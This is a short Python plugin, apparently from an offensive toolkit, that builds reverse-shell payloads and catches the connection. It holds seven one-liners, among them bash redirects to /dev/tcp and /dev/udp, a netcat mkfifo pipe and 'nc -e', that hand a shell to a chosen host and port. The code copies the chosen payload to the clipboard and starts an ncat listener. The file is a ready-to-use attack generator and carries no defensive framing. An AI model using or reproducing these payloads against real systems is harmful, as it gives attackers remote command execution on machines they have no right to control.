import os
from plugins.common import *
import pyperclip

def ohios(host, port, _type, shell):
    ohio = {
        'bash_i': f"{shell} -i >& /dev/tcp/{host}/{port} 0>&1",
        'bash_196': f"0<&196;exec 196<>/dev/tcp/{host}/{port}; csh <&196 >&196 2>&196",
        'bash_read_line': f"exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
        'bash_5': f"{shell} -i 5<> /dev/tcp/{host}/{port} 0<&5 1>&5 2>&5",
        'bash_udp': f"{shell} -i >& /dev/udp/{host}/{port} 0>&1",
        'nc_mkfifo': f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {host} {port} >/tmp/f",
        'nc_e': f"nc {host} {port} -e {shell}",
    }

    return ohio.get(_type, "what u doing gng")

def shell(host, port, bind):
    if checkip(host) == False: error('Please enter a valid IP'); return
    shells = ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'pwsh', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh', 'mksh', 'dash']
    types = ['bash_i', 'bash_196', 'bash_read_line', 'bash_5', 'bash_udp', 'nc_mkfifo', 'nc_e']
    print(f'{yellow}{f"{white},{yellow} ".join(shells)}')
    uno = input(f'Select shell>{white} ').strip()
    if uno not in shells: error('Please choose a valid shell') ;return
    if not str(port).isdigit() or not (1 <= int(port) <= 65535): error('Invalid port number') ;return
    print(f'{yellow}{f"{white},{yellow} ".join(types)}')
    t = input(f'Select type>{white} ').strip()
    if t not in types: error('Please choose a valid type'); return
    result = ohios(host, port, t, uno)
    pyperclip.copy(result)
    print(f'{green}Payload>{white} {result}')
    os.system(f'ncat -lvnp {bind}')
